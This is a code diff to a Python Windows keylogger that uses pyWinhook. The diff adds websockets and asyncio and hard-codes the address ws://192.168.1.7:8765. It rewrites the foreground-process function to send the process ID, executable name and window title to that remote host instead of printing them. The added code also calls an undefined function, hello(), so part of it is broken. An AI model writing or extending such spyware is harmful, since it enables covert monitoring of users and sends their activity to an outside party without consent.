@@ -2,14 +2,18 @@ from ctypes import *
 import pythoncom
 import pyWinhook as pyhook
 import pywintypes as pywin32
+import websockets
+import asyncio
 
 user32 = windll.user32
 kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
 
+url = "ws://192.168.1.7:8765"
 
-def get_current_process():
+
+async def get_current_process():
     # get a handle to the foreground window
     hwnd = user32.GetForegroundWindow()
 
@@ -32,11 +36,18 @@ def get_current_process():
 
     # print out the header if we're in the right process
     print()
-    print("[ PID: %s - %s - %s ]" % (process_id,
-                                     executable.value,
-                                     window_title.value)
-          )
-    print()
+
+    async with websockets.connect(url) as websocket:
+        keylogger_data = f"ID:{process_id} exe:{executable.value} title:{window_title.value}"
+
+        await websocket.send(keylogger_data)
+
+    asyncio.get_event_loop().run_until_complete(hello())
+    # print("[ PID: %s - %s - %s ]" % (process_id,
+    #                                  executable.value,
+    #                                  window_title.value)
+    #       )
+    # print()
 
     # close handles
     kernel32.CloseHandle(hwnd)
